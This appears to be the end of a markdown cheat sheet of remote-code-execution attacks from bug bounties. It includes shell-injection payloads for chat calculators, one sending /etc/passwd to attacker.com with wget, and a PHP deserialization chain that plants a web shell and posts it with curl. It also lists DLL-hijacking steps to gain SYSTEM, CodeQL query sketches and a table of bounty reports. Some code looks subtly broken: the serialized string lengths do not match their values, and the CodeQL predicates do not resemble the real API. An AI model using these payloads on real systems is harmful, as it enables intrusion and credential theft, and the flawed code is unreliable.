### Bash Injection via Chat /calculate $(ping attacker.com)
Chat applications with inline calculation features (e.g., `/calculate 2+2`) are prone to command injection if the input is passed to a shell for evaluation:
```
/calculate $(ping -c 1 attacker.com)
/calculate `wget --post-file=/etc/passwd http://attacker.com/`
/calculate {id,}
```
If the calculator uses `eval()`, `system()`, or `exec()` on the server side, the injected commands execute on the host. This is especially common in:
- ChatOps integrations (Slack, Discord bots)
- Custom in-app calculator features
- Formula evaluation in spreadsheets/dashboards

### PHP unserialize() Injection to Code Execution
PHP's `unserialize()` function deserializes user-supplied data and automatically triggers `__wakeup()`, `__destruct()`, `__toString()`, and `__call()` magic methods on instantiated objects. If a gadget chain is available in the codebase, this leads to RCE:
```php
// Step 1: Find a class with dangerous __destruct() or __wakeup()
class Logger {
    public $filename;
    public $data;
    public function __destruct() {
        file_put_contents($this->filename, $this->data);
    }
}

// Step 2: Craft serialized payload
$payload = serialize(new Logger());
// O:6:"Logger":2:{s:8:"filename";s:17:"/var/www/html/shell.php";s:4:"data";s:19:"<?php system($_GET['c']);?>";}

// Step 3: Send to unserialize() call
curl -sk -X POST "https://target.com/api/import" -d "data=$payload_base64"
```
Tools like `phpggc` generate gadget chains for popular frameworks (Laravel, Symfony, WordPress, Drupal, etc.).

### DLL Hijacking + Arbitrary File Deletion for Privilege Escalation During Install
During software installation, DLL hijacking combined with arbitrary file deletion can escalate privileges to SYSTEM:
1. Find a service running as SYSTEM that attempts to load a missing DLL from a user-writable directory
2. Use arbitrary file deletion (via TOCTOU or uninstaller vulnerability) to remove a legitimate DLL
3. Place a malicious DLL with the same name in a directory the service searches first (e.g., current working directory, PATH)
4. The service loads the attacker's DLL with SYSTEM privileges
5. The malicious DLL executes as SYSTEM, granting full privilege escalation

Common targets: Windows services, installer executables, scheduled tasks that load DLLs from `%TEMP%` or the application directory.

### CodeQL Queries as Methodology (Static Analysis for Vulnerability Hunting)
CodeQL is a static analysis engine that allows writing custom queries to find vulnerabilities in codebases. Using CodeQL as a methodology for RCE hunting:
```ql
// Find command injection sinks
import javascript

from CommandInjectionSink sink, RemoteFlowSource source
where sink.getCommand() = source.getAFlowSource()
select sink, source

// Find deserialization of untrusted data
import java

from DeserializationSink sink, RemoteFlowSource source
where sink.getArgument() = source.getAFlowSource()
select sink, source

// Find SSTI via template engine
import python

from TemplateInjectionSink sink, RemoteFlowSource source
where TemplateInjection::flow(source, sink)
select sink, source
```
Benefits:
- Query the entire codebase at once (not just one file at a time)
- Find complex multi-step data flows (sink → sanitizer → source)
- Reuse community-maintained query packs for OWASP Top 10
- Automate in CI/CD for continuous vulnerability discovery

## Quick Reference: Top RCE Reports by Payout/Votes
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #115000 | Steam | Buffer overflow RCE | (1287 upvotes) |
| #1132814 | Twitter | VPN pre-auth RCE | $20,160 |
| #130815 | PayPal | npm dependency confusion | $30,000 |
| #1409896 | Shopify | H1514 file upload RCE | (829 upvotes) |
| #1150876 | PayPal | Java deserialization RCE | $17,376 |
| #131227 | Uber | Java deserialization RCE | $10,000 |
| #1689514 | Uber | SSTI RCE via template | (critical) |
| #713900 | QIWI | SSRF → RCE via SSO | $5,000 |
| #366638 | Uber | Portainer Docker RCE | $5,000 |
| #1464304 | Multiple | Log4j JNDI injection | (critical) |
| #135122 | Multiple | ImageMagick RCE | (varies) |
| #792464 | Nextcloud | Command injection RCE | $1,000 |

(End of file - total 680 lines)
